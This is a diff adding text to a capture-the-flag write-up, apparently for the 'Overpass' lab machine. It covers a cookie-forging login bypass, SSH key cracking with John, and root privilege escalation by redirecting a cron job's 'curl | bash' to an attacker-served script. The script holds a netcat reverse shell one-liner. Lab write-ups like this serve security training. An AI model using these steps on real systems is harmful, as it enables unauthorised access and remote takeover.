@@ -44,4 +44,73 @@ This looks interesting:
         passwordBox.value=""
     } else {
         Cookies.set("SessionToken",statusOrCookie)
-        window.location = "/admin"````
+        window.location = "/admin"```
+
+This code checks a value stored in "loginStatus" for the text "Incorrect Credentials". If it matches that value, then it denies us entry. We need to modify the value of "statusOrCookie" so we can trigger the else condition of this function. (At least this is what I gathered from the snippet, I have the coding skills of a hamster)
+
+The cookies name is "SessionToken". Let's input `Cookies.set("SessionToken", "test")` in the dev tools>storage>cookies section of firefox and then refresh the page.
+
+**NOTE: I couldn't get this to work without changing the URL from /admin.html to /admin ... I don't know why but it was pretty frustrating.**
+
+Refreshing the page shows us an RSA key for "James". We can steal it, crack it with John, and then use those creds to log in to the users session.
+
+`/opt/john/ssh2john.py ssh.txt > ssh.hash`
+
+`john ssh.hash`
+
+Now let's login
+
+`ssh -i ssh.txt james@10.10.198.26`
+
+Enter the passphrase that john cracked.
+
+Grab the user flag, and check out the other file on the desktop "todo.txt"
+
+A quick `sudo -l` tells us we need a sudo password if we want to escalate our privileges via a LOLBIN. 
+
+Checking the contents of /etc/shadow tells us we don't have permission to see it.
+
+We can however see /etc/passwd and checking the crontan also yields some interesting information.
+
+> * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+Looks like we have a bash script that's running as root.
+
+The script downloads "buildscript.sh" from the website. Unfortunately we don't have write permissions to crontab, but notice how it's using "overpass.thm" instead of the machine IP. This means that there's an entry in the hosts file that makes this possible. Let's edit the hosts file and redirect the request to our machine.
+
+
+We'll need to setup a python webserver on our attackbox for this and setup a directory structure on our machine that's identical to the cronjob.
+
+Unfortunately, port 80 is already in use on the attackbox (since we're using the browser) and we can't change the port in the hosts file. We'll need to set up a reverse proxy. After some googling, I found that `nginx` can help us out with this. Let's install it and then create a file called "overpass.thm" at `/etc/nginx/conf.d`
+
+The file will contain:
+
+```server {
+
+    listen 80;
+    server_name overpass.thm;
+    location / {
+        proxy_pass http://127.0.0.1:8081/;
+    }
+}
+```
+
+Now, when the target sends a request to our machine on port 80, it'll be forwarded to port 8080 which is where we will set up the python webserver. Don't forget to create a "buildscript.sh" inside /downloads/src which is where we will put our netcat shell spawning script.
+
+`rm -f /tmp/a; mkfifo /tmp/a; nc <Attackbox IP> 4444 0</tmp/a | /bin/sh >/tmp/a 2>&1; rm /tmp/a `
+
+setup our python3 webserver...
+
+`python3 -m http.server 8081`
+
+and finally...set up our netcat listener to catch she shell.
+
+`nc -lvnp 4444`
+
+
+
+
+
+
+
+
